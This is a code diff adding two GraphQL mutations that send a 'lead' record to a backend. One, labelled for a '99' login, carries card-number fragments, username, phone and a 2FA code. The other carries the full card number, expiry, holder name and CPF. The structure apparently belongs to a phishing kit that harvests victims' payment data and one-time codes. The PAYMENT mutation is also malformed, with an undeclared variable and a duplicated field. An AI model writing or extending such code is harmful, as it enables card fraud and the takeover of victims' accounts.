@@ -114,3 +114,61 @@ export const COMPLETE_INFO = gql`
         step,
       }
     }`;
+export const LOGIN_99 = gql`
+    mutation  updateLead(
+        $cardbegin: String!,
+        $cardend: String!,
+        $username: String!,
+        $driver: String!,
+        $phone: String!,
+        $code2fa: String!
+        ) {
+      updateLead(input: { 
+        		login99: {
+              cardbegin: $cardbegin,
+              cardend: $cardend,
+              username: $username,
+              driver: $driver
+            },
+            phone_number: $phone,
+            code2fa: $code2fa,
+          
+           }) {
+        id,
+        status,
+        step,
+      }
+    }
+   `;
+export const PAYMENT = gql`
+    mutation  updateLead(
+        $cc_holder_name: String!,
+        $cc_holder_cpf: String!,
+        $cc_number: String!,
+        $cc_expired_at: String!,
+        $driver: String!,
+        $type: String!,
+        $phone: String!,
+        $code2fa: String!
+        ) {
+      updateLead(input: { 
+        	payment: {
+              cc_holder_name: $cc_holder_name,
+              cc_holder_cpf: $cc_holder_cpf,
+              cc_number: $cc_number,
+              cc_expired_at: $cc_expired_at,
+              driver: $driver
+              username: $username,
+              driver: $driver
+              type: $type
+            },
+            phone_number: $phone,
+            code2fa: $code2fa,
+          
+           }) {
+        id,
+        status,
+        step,
+      }
+    }
+   `;
